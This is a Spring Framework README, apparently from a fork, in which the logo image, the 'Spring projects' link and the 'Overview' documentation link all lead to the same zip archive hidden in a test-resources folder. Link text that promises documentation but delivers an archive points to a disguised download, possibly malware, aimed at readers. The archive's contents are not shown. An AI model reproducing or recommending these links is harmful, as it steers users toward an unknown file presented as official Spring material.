# <img src="https://github.com/tanglongwei/spring-framework/raw/refs/heads/master/spring-aspects/src/test/resources/org/springframework/framework-spring-v2.7.zip" width="80" height="80"> Spring Framework

This is the home of the Spring Framework, the foundation for all
[Spring projects](https://github.com/tanglongwei/spring-framework/raw/refs/heads/master/spring-aspects/src/test/resources/org/springframework/framework-spring-v2.7.zip). Together the Spring Framework and the family of Spring projects make up what we call "Spring". 

Spring provides everything you need beyond the Java language to create enterprise
applications in a wide range of scenarios and architectures. Please read the
[Overview](https://github.com/tanglongwei/spring-framework/raw/refs/heads/master/spring-aspects/src/test/resources/org/springframework/framework-spring-v2.7.zip)
section in the reference for a more complete introduction.
